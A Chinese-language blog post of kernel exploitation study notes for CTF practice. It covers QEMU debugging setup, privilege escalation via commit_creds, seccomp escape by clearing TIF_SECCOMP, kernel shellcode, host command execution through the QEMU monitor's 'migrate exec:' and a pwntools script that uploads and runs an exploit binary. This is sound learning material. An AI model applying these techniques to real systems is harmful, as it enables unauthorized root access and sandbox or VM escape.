---
layout: post
tags: [kernel_pwn]
title: "kernel security 2: ptracticing"
author: wsxk
date: 2025-9-15
comments: true
---

- [1. kernel 环境搭建](#1-kernel-环境搭建)
  - [1.1 自安装](#11-自安装)
  - [1.2 一键式脚本](#12-一键式脚本)
  - [1.3 kernel debug](#13-kernel-debug)
- [2. kernel escalation](#2-kernel-escalation)
  - [2.1 内核标识进程权限的结构体](#21-内核标识进程权限的结构体)
  - [2.2 获得root权限的方法](#22-获得root权限的方法)
- [3. kernel race conditions](#3-kernel-race-conditions)
- [4. kernel seccomp escape](#4-kernel-seccomp-escape)
  - [4.1 seccomp如何作用于syscall](#41-seccomp如何作用于syscall)
  - [4.2 kernel中绕过seccomp的方法](#42-kernel中绕过seccomp的方法)
- [5. kernel shellcode](#5-kernel-shellcode)
  - [5.1 如何找到kernel api地址](#51-如何找到kernel-api地址)
  - [5.2 如何调用kernel api](#52-如何调用kernel-api)
  - [5.3 编写seccomp逃逸相关的代码](#53-编写seccomp逃逸相关的代码)
  - [5.4 常见的kernel shellcode](#54-常见的kernel-shellcode)
    - [5.4.1 权限提升](#541-权限提升)
- [特典: kernel pwn tricks:](#特典-kernel-pwn-tricks)
  - [特典一：qemu monitor模式](#特典一qemu-monitor模式)
  - [特典二: kernel pwn远程传文件脚本](#特典二-kernel-pwn远程传文件脚本)


# 1. kernel 环境搭建<br>
kernel环境搭建需要4个部分:<br>
```
1. 编译器compiler： gcc，用于编译内核模块和内核
2. 内核 kernel： 无需多言，内核elf文件
3. 文件系统 filesystem： 用于存储，有了它，内核才可以存放各种文件。
4. 模拟器 emulator： 多数情况下指的是qemu，用于模拟执行内核
```
## 1.1 自安装<br>
可参考我22年左右写的blog，[https://wsxk.github.io/ubuntu_kernel%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/](https://wsxk.github.io/ubuntu_kernel%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/)<br>
自己安装是非常复杂的操作.<br>

## 1.2 一键式脚本<br>
pwn.college提供了一键式脚本:<br>
[https://github.com/pwncollege/pwnkernel/tree/main](https://github.com/pwncollege/pwnkernel/tree/main)<br>
直接运行即可，方便快捷~<br>
考虑到仓库的更新时间，使用ubuntu22虚拟机会是个比较好的选择。<br>

## 1.3 kernel debug<br>
内核问题通常涉及到需要编写c代码并编译成静态可执行程序，然后打包进内核的文件系统中，才能执行。这样有一个问题，**每次重新编写exp时，就要关闭内核，将exp打包进文件系统，再启动内核**,太麻烦了，有一种解决办法<br>
```
/usr/bin/qemu-system-x86_64 \
	-kernel linux-5.4/arch/x86/boot/bzImage \
	-initrd $PWD/initramfs.cpio.gz \
	-fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \     #关键1
	-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \    #关键2
	-nographic \
	-monitor none \
	-s \
	-append "console=ttyS0 nokaslr"
```
关键1和关键2两个参数相当于把宿主机的`$HOME`目录挂载到来宾机的`$HOME`目录下，这样我们在宿主机上编写程序后就可以快速开始调试，节省时间:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250831103629.png)

kernel调试的理想条件：<br>
```
1. kernel携带debug symbols，即可以 b commit_creds直接下断点
2. kaslr关闭，即每次启动kernel的地址空间没有变化，方便调试
```
**理论上来说，我们也可以通过gdb *0x401000调试用户态进程！**<br>
大伙感兴趣的话可以调试一下`syscall`的过程,这个过程对之后kernel的利用起到了非常大的作用<br>

# 2. kernel escalation<br>
安全的从用户态《-》内核态传输数据的函数如下:<br>
```c
copy_to_user(userspace_address, kernel_address, length);
copy_from_user(kernel_address, userspace_address, length);
```
但是kernel本质上也是代码，有代码就有漏洞！通常内核漏洞能够导致**内核crash，内核卡死，权限提升，干扰其他进程**等等，当然，我们关注的主要还是权限提升辣<br>

## 2.1 内核标识进程权限的结构体<br>
内核为每个运行的进程都保留了一个`task_struct`结构体，用于追踪进程的用户权限以及其他相关信息:<br>
```c
struct task_struct {
    struct thread_info    	thread_info;

    /* -1 unrunnable, 0 runnable, >0 stopped: */
    volatile long         	state;

    void                  	*stack;
    atomic_t              	usage;
	// ...
    int                   	prio;
    int                   	static_prio;
    int                   	normal_prio;
    unsigned int          	rt_priority;

    struct sched_info     	sched_info;

    struct list_head      	tasks;

    pid_t                 	pid;
    pid_t                 	tgid;

    /* Process credentials: */

    /* Objective and real subjective task credentials (COW): */
    const struct cred __rcu  *real_cred;

    /* Effective (overridable) subjective task credentials (COW): */
    const struct cred __rcu  *cred;
	// ...
};

struct cred {
    atomic_t    usage;
    kuid_t   	 uid;   	 /* real UID of the task */
    kgid_t   	 gid;   	 /* real GID of the task */
    kuid_t   	 suid;   	 /* saved UID of the task */
    kgid_t   	 sgid;   	 /* saved GID of the task */
    kuid_t   	 euid;   	 /* effective UID of the task */
    kgid_t   	 egid;   	 /* effective GID of the task */
    kuid_t   	 fsuid;   	 /* UID for VFS ops */
    kgid_t   	 fsgid;   	 /* GID for VFS ops */
    unsigned    securebits;    /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;    /* caps we're permitted */
    kernel_cap_t    cap_effective;    /* caps we can actually use */
    kernel_cap_t    cap_bset;    /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
	// ...
};
```
理论上，**我们只要能够操作kernel修改当前进程的cred结构体中的uid/euid为0，那么我们就能获得root权限**！<br>

## 2.2 获得root权限的方法<br>
kernel提供了两个非常有用的api:<br>
```c
//准备一个cred结构体，当输入为0时，它返回一个root权限的cred！
struct cred * prepare_kernel_cred(struct task_struct *reference_task_struct)

//将获得的root cred提交，进程就会获得root权限
commit_creds(struct cred *)

//即，只要运行 commit_creds(prepare_kernel_cred(0));就能获得root权限！
//当然，内核还维护了一个初始结构体`init_cred`,即commit_creds(init_cred);也能获得root权限！
```
遇到获取kernel地址的问题时，可以参考章节`# 获取kernel地址的方法`<br>

# 3. kernel race conditions<br>
**条件竞争是折磨的内核的巨大问题，原因在于每个`kernel module`都是倾向于多线程的程序（因为用户态有多个程序与内核模块交互是一个很常见的事情）**<br>
```
1. what happens if two devices open /dev/pwn-college simultaneously?
如果两个设备同时打开了kernel module，默认情况下是允许的！这种情况下如果你的kernel module写的不好，很有可能发生条件竞争漏洞

2. what happens if make_root.ko is removed while /proc/pwn-college is open
如果在kernel module被打开的情况下，卸载了内核模块，它们可能会在执行过程中消失或交换资源
```


# 4. kernel seccomp escape<br>
`seccomp`本质上也是部署在`kernel`当中的，所以能够利用`kernel`的漏洞完成seccomp逃逸。<br>
```c
//回顾 ## 2.1 内核标识进程权限的结构体 章节中，task_struct有一个thread_info结构体
struct task_struct {
    struct thread_info    	thread_info;
}

struct thread_info {
    unsigned long flags;	/* low level flags */
    u32 status;		/* thread synchronous flags */
};
```
`thread_info`中的`flags`变量中有一个标志位`TIF_SECCOMP`,标志是否开启了seccomp<br>
## 4.1 seccomp如何作用于syscall<br>
在`linux`的syscall entry中，代码如下所示:<br>
```c
/*
	 * Handle seccomp.  regs->ip must be the original value.
	 * See seccomp_send_sigsys and Documentation/userspace-api/seccomp_filter.rst.
	 *
	 * We could optimize the seccomp disabled case, but performance
	 * here doesn't matter.
	 */
	regs->orig_ax = syscall_nr;
	regs->ax = -ENOSYS;
	tmp = secure_computing();
	if ((!tmp && regs->orig_ax != syscall_nr) || regs->ip != address) {
		warn_bad_vsyscall(KERN_DEBUG, regs,
				  "seccomp tried to change syscall nr or ip");
		do_exit(SIGSYS);
	}
```
而`secure_computing`的函数实现如下图所示：<br>
```c
static inline int secure_computing(void)
{
	if (unlikely(test_thread_flag(TIF_SECCOMP)))//关键函数，如果TIF_SECCOMP没有被设置，说明没有seccomp机制
		return  __secure_computing(NULL);
	return 0;
}
int __secure_computing(const struct seccomp_data *sd)
{
	// lots of stuff, then...

	this_syscall = sd ? sd->nr : syscall_get_nr(current, task_pt_regs(current));

	switch (mode) {
		case SECCOMP_MODE_STRICT:
			__secure_computing_strict(this_syscall);  /* may call do_exit */
			return 0;
		case SECCOMP_MODE_FILTER:
			return __seccomp_filter(this_syscall, sd, false);
		default:
			BUG();
	}
}
```
## 4.2 kernel中绕过seccomp的方法<br>
只要在c语言中这么调用：<br>
```c
current_task_struct->thread_info.flags &= ~(1 << TIF_SECCOMP)
//The kernel points the segment register gs to the current task struct.
//所以gs寄存器指向current task struct
```
就能关闭seccomp机制~,具体实施措施如下:<br>
```
1. 通过gs寄存器访问current->thread_info.flags
2. 清空TIF_SECCOMP 标志
```

# 5. kernel shellcode<br>
在kernel中执行shellcode时，我们可以直接使用kernel提供的api帮我们解决问题！<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250906151639.png)
## 5.1 如何找到kernel api地址<br>
对于开启了kaslr的题目，想办法获取kernel地址是非常重要的：<br>
```
0. 内核没开启kaslr（可以通过cat /proc/cmdline确认）
/proc/cmdline 是 procfs 里的一条只读“虚拟文件”，内容就是这次开机时 bootloader 传给内核的命令行参数（一整行，空格分隔）。拿它来判断是否带了 nokaslr、console=...、root=... 等启动参数。

1. cat /proc/kallsym

2. cat /proc/modules

3. cat /sys/module/xxxx/sections/.text 

4. 如果你能造成内核panic的话，打印报错信息时的r11寄存器就是内存地址

5. dmesg会打印内核日志，有的可能会打印出内核地址
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250827195452.png)
如果以上办法都不行，我们可能需要想办法去leak 地址。<br>
## 5.2 如何调用kernel api<br>
正常的call需要一个32位的偏移量来执行代码<br>
我们可以执行绝对值跳转:<br>
```asm
mov rax, 0xffff414142424242
call rax
```
## 5.3 编写seccomp逃逸相关的代码<br>
先前提到，内核用`gs`寄存器指向当前进程的`current task struct`<br>
在c内核开发中，我们可以用`current`速记宏来代表当前进程的`current task struct`<br>
在shellcode中，我们要如何代表它呢？直接抄作业就行了！<br>
利用速记宏，开发一下内核代码，将其编译成二进制，查看他的汇编:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250906152928.png)

## 5.4 常见的kernel shellcode<br>
### 5.4.1 权限提升<br>
先前提到，权限提升通常是执行`commit_creds(init_cred)`来完成，所以在能够在内核态下执行shellcode时，我们可以编写shellcode执行`commit_creds(init_cred)`即可完成提权。<br>


# 特典: kernel pwn tricks:<br>
这些特典或许不能帮助我们理解kernel，但是可以帮助我们ctf题目中快速拿分！<br>
## 特典一：qemu monitor模式<br>
`QEMU monitor` 是 QEMU 内置的一个交互式控制台窗口，主要用于监控和管理虚拟机的状态。由于 Linux kernel pwn 题目通常使用 QEMU 创建虚拟机环境，因此若是未禁止选手对 QEMU monitor 的访问，则选手可以直接获得整个虚拟机的访问权限。同时，由于 QEMU monitor 支持在 host 侧执行命令，因此也可以直接读取题目环境中的 flag，这同时意味着我们还能可以利用 QEMU monitor 完成虚拟化逃逸。<br>
***对于出题人而言，应当时刻保证 QEMU 的参数包含一行 -monitor none 或是 -monitor /dev/null 以确保选手无法访问 QEMU monitor。***<br>
通常情况下，进入 QEMU monitor 的方法如下:<br>
```
1. 首先同时按下 CTRL + A
2. 接下来按 C
```
使用 pwntools 脚本时，可以通过发送 `"\x01c"` 完成，例如：<br>
```python
p = remote("localhost", 11451)
p.send(b"\x01c")
```
在 QEMU monitor 当中有一条比较好用的指令叫做`migrate`，其支持我们执行特定的 URI：<br>
```
(qemu) help migrate
migrate [-d] [-r] uri -- migrate to URI (using -d to not wait for completion)
                         -r to resume a paused postcopy migration
```
其中，**`URI 可以是 'exec:<command>' 或 tcp:<ip:port>`**，前者支持我们直接在宿主机上执行命令，例如下面的命令在宿主机上执行了 ls 命令：<br>
```
migrate "exec: sh -c ls"
```
有的时候可能会由于一些特殊原因遇到没有输出的情况，这个时候可以尝试将 stdout 重定向至 stderr，例如：
```
(qemu) migrate "exec: whoami"
qemu-system-x86_64: failed to save SaveStateEntry with id(name): 2(ram): -5
qemu-system-x86_64: Unable to write to command: Broken pipe
qemu-system-x86_64: Unable to write to command: Broken pipe
(qemu) migrate "exec: whoami 1>&2"
arttnba3
qemu-system-x86_64: failed to save SaveStateEntry with id(name): 2(ram): -5
qemu-system-x86_64: Unable to write to command: Broken pipe
qemu-system-x86_64: Unable to write to command: Broken pipe
(qemu) 
```

[https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/)<br>


## 特典二: kernel pwn远程传文件脚本<br>
我直接超了这位佬的脚本.jpg<br>
[https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA)<br>
```python
from pwn import *
import base64
#context.log_level = "debug"

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("127.0.0.1", 11451)
#p = process('./run.sh')
try_count = 1
while True:
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")
    
    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")
    p.sendline("/tmp/exploit ")
    break

p.interactive()
```


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>